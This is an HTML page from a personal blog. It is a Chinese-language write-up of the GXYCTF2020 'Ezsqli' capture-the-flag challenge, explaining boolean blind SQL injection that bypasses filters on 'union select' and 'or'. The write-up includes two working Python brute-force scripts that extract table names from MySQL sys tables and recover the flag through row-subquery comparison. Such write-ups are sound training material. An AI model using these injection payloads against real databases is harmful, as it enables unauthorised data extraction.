@@ -1,0 +1,468 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.24.0 by Michael Rose
+  Copyright 2013-2020 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>GXYCTF2020 - Ezsqli - Yueyejian’s Blog</title>
+<meta name="description" content="GXYCTF2020 - Ezsqli 0x00 判断注入类型 先测试一下，发现过滤了 union select, or 等等，报错注入也没用。输入 1&amp;&amp;1=1 和输入1&amp;&amp;1=2 时，发现回显不同，所以存在布尔盲注。">
+
+
+  <meta name="author" content="yueyejian">
+  
+  <meta property="article:author" content="yueyejian">
+  
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="Yueyejian's Blog">
+<meta property="og:title" content="GXYCTF2020 - Ezsqli">
+<meta property="og:url" content="http://localhost:4000/ctf/ezsqli/">
+
+
+  <meta property="og:description" content="GXYCTF2020 - Ezsqli 0x00 判断注入类型 先测试一下，发现过滤了 union select, or 等等，报错注入也没用。输入 1&amp;&amp;1=1 和输入1&amp;&amp;1=2 时，发现回显不同，所以存在布尔盲注。">
+
+
+
+
+
+
+
+  <meta property="article:published_time" content="2020-03-06T00:00:00+08:00">
+
+
+
+
+
+
+<link rel="canonical" href="http://localhost:4000/ctf/ezsqli/">
+
+
+
+
+<script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    
+      "@type": "Person",
+      "name": "yueyejian",
+      "url": "http://localhost:4000/"
+    
+  }
+</script>
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+<link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+<noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css"></noscript>
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single wide">
+    <nav class="skip-links">
+  <ul>
+    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
+    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
+    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
+  </ul>
+</nav>
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+        <a class="site-title" href="/">
+          Yueyejian's Blog
+          
+        </a>
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/about/">About</a>
+            </li><li class="masthead__menu-item">
+              <a href="/categories/">Categories</a>
+            </li><li class="masthead__menu-item">
+              <a href="/tags/">Tags</a>
+            </li></ul>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+
+
+    <div class="initial-content">
+      
+
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person" class="h-card">
+
+  
+    <div class="author__avatar">
+      <a href="https://yueyejian13.github.io">
+        <img src="/assets/images/avatar.jpg" alt="yueyejian" itemprop="image" class="u-photo">
+      </a>
+    </div>
+  
+
+  <div class="author__content">
+    <h3 class="author__name p-name" itemprop="name">
+      <a class="u-url" rel="me" href="https://yueyejian13.github.io" itemprop="url">yueyejian</a>
+    </h3>
+    
+      <div class="author__bio p-note" itemprop="description">
+        
+
+      </div>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
+          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name" class="p-locality">Somewhere in China.</span>
+        </li>
+      
+
+      
+        
+          
+            <li><a href="https://yueyejian13.github.io" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fas fa-fw fa-home" aria-hidden="true"></i><span class="label">首页</span></a></li>
+          
+        
+          
+            <li><a href="https://github.com/yueyejian13" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fab fa-fw fa-github" aria-hidden="true"></i><span class="label">GitHub</span></a></li>
+          
+        
+          
+            <li><a href="https://paypal.me/yueyejian?country.x=C2&locale.x=zh_XC" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fas fa-fw fa-link" aria-hidden="true"></i><span class="label">buymeacoffee</span></a></li>
+          
+        
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+  
+  </div>
+
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="GXYCTF2020 - Ezsqli">
+    <meta itemprop="description" content="GXYCTF2020 - Ezsqli0x00 判断注入类型先测试一下，发现过滤了 union select, or 等等，报错注入也没用。输入 1&amp;&amp;1=1 和输入1&amp;&amp;1=2 时，发现回显不同，所以存在布尔盲注。">
+    <meta itemprop="datePublished" content="2020-03-06T00:00:00+08:00">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">GXYCTF2020 - Ezsqli
+</h1>
+          
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-calendar-alt" aria-hidden="true"></i>
+        
+        <time datetime="2020-03-06T00:00:00+08:00">March 6, 2020</time>
+      </span>
+    
+
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-clock" aria-hidden="true"></i>
+        
+          1 minute read
+        
+      </span>
+    
+  </p>
+
+
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+          <aside class="sidebar__right ">
+            <nav class="toc">
+              <header><h4 class="nav__title"><i class="fas fa-file-alt"></i> Contents</h4></header>
+              <ul class="toc__menu"><li><a href="#gxyctf2020---ezsqli">GXYCTF2020 - Ezsqli</a><ul><li><a href="#0x00-判断注入类型">0x00 判断注入类型</a></li><li><a href="#0x01-利用sysschema_table_statistics爆表名">0x01 利用sys.schema_table_statistics爆表名</a></li><li><a href="#0x02-无列名注入">0x02 无列名注入</a></li></ul></li></ul>
+
+            </nav>
+          </aside>
+        
+        <h1 id="gxyctf2020---ezsqli">GXYCTF2020 - Ezsqli</h1>
+<h2 id="0x00-判断注入类型">0x00 判断注入类型</h2>
+<p>先测试一下，发现过滤了 union select, or 等等，报错注入也没用。输入 1&amp;&amp;1=1 和输入1&amp;&amp;1=2 时，发现回显不同，所以存在布尔盲注。</p>
+
+<h2 id="0x01-利用sysschema_table_statistics爆表名">0x01 利用sys.schema_table_statistics爆表名</h2>
+<p>因为or、in被过滤了，所以information_schema.columns不能用了，这时候我们可以利用sys.schema_table_statistics这个表。</p>
+
+<p>写个脚本：</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">requests</span>
+<span class="n">flag</span><span class="o">=</span><span class="sh">''</span>
+<span class="n">url</span><span class="o">=</span><span class="sh">'</span><span class="s">http://ca5cdac5-e97e-42df-9ed0-233bc75b4c4d.node3.buuoj.cn/index.php</span><span class="sh">'</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">50</span><span class="p">):</span>
+    <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">33</span><span class="p">,</span><span class="mi">127</span><span class="p">):</span>
+        <span class="n">payload</span> <span class="o">=</span> <span class="sh">"</span><span class="s">1&amp;&amp;ascii(substr((select group_concat(table_name)from sys.x$schema_flattened_keys where table_schema=database()),</span><span class="sh">"</span><span class="o">+</span><span class="nf">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">+</span><span class="sh">"</span><span class="s">,1))=</span><span class="sh">"</span><span class="o">+</span><span class="nf">str</span><span class="p">(</span><span class="n">j</span><span class="p">)</span><span class="o">+</span><span class="sh">""</span>
+        <span class="n">data</span><span class="o">=</span><span class="p">{</span>
+            <span class="sh">'</span><span class="s">id</span><span class="sh">'</span><span class="p">:</span> <span class="n">payload</span>
+        <span class="p">}</span>
+        <span class="n">r</span><span class="o">=</span><span class="n">requests</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
+        <span class="k">if</span> <span class="sh">'</span><span class="s">Nu1L</span><span class="sh">'</span> <span class="ow">in</span> <span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">:</span>
+            <span class="n">flag</span><span class="o">=</span><span class="n">flag</span><span class="o">+</span><span class="nf">chr</span><span class="p">(</span><span class="n">j</span><span class="p">)</span>
+            <span class="nf">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
+            <span class="k">break</span>
+</code></pre></div></div>
+<h2 id="0x02-无列名注入">0x02 无列名注入</h2>
+<p>这时已经得到 f1ag_1s_h3r3_hhhhh这个表名了，但是不知道列名。常见的无列名注入是要结合联合查询的，但是union select被过滤了。这时可以通过加括号比较来判断这个表的列数，输入1&amp;&amp;((1,1)&gt;(select * from f1ag_1s_h3r3_hhhhh))返回 Nu1L，说明有两列。</p>
+
+<p>官方文档：<a href="https://dev.mysql.com/doc/refman/8.0/en/row-subqueries.html">https://dev.mysql.com/doc/refman/8.0/en/row-subqueries.html</a></p>
+
+<p>继续测试，给右边的1加个引号，发现报错了。把右边的1换成 <strong>‘f’</strong>，继续报错，换成 <strong>‘g’</strong>，返回正确结果，这时基本上可以判定flag在这个表的第二列了。</p>
+
+<p>写脚本跑一下：</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">requests</span>
+<span class="n">url</span> <span class="o">=</span> <span class="sh">'</span><span class="s">http://6c05130d-3668-41d6-9ad6-5e69ce00e0cc.node3.buuoj.cn/index.php</span><span class="sh">'</span>
+<span class="n">x</span><span class="o">=</span><span class="sh">''</span>
+<span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">50</span><span class="p">):</span>
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">33</span><span class="p">,</span><span class="mi">127</span><span class="p">):</span>
+        <span class="n">flag</span><span class="o">=</span><span class="n">x</span><span class="o">+</span><span class="nf">chr</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
+        <span class="n">payload</span> <span class="o">=</span> <span class="sh">"</span><span class="s">1&amp;&amp;((1,</span><span class="sh">'</span><span class="s">{}</span><span class="sh">'</span><span class="s">)&gt;(select * from f1ag_1s_h3r3_hhhhh))</span><span class="sh">"</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
+        <span class="n">data</span><span class="o">=</span><span class="p">{</span>
+        <span class="sh">'</span><span class="s">id</span><span class="sh">'</span><span class="p">:</span><span class="n">payload</span>
+        <span class="p">}</span>
+        <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
+        <span class="k">if</span> <span class="sh">'</span><span class="s">Nu1L</span><span class="sh">'</span> <span class="ow">in</span> <span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">:</span>
+            <span class="n">x</span><span class="o">=</span><span class="n">x</span><span class="o">+</span><span class="nf">chr</span><span class="p">(</span><span class="n">i</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
+            <span class="nf">print</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
+            <span class="k">break</span>
+</code></pre></div></div>
+<p>flag就慢慢出来了，最后再转化一下大小写就行了</p>
+
+<p>(第一次自己写脚本，写了好久….网上dalao们的脚本好多都看不懂，没想到我也可以！出flag的时候好激动！！</p>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      <a href="/tags/#ctf" class="page__taxonomy-item" rel="tag">ctf</a><span class="sep">, </span>
+    
+      <a href="/tags/#mysql" class="page__taxonomy-item" rel="tag">mysql</a><span class="sep">, </span>
+    
+      <a href="/tags/#sqli" class="page__taxonomy-item" rel="tag">sqli</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      <a href="/categories/#ctf" class="page__taxonomy-item" rel="tag">ctf</a>
+    
+    </span>
+  </p>
+
+
+        
+
+  <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2020-03-06T00:00:00+08:00">March 6, 2020</time></p>
+
+
+      </footer>
+
+      
+
+      
+  <nav class="pagination">
+    
+      <a href="/tricks/mysql/" class="pagination--pager" title="除了information_schema之外几个可以利用的表
+">Previous</a>
+    
+    
+      <a href="/ctf/easythinking/" class="pagination--pager" title="GYCTF2020 - EasyThinking
+">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+  
+</div>
+
+    </div>
+
+    
+
+    <div id="footer" class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+
+    
+
+    
+  </ul>
+</div>
+
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+
+
+
+
+
+
+
+
+
+
+  </body>
+</html>
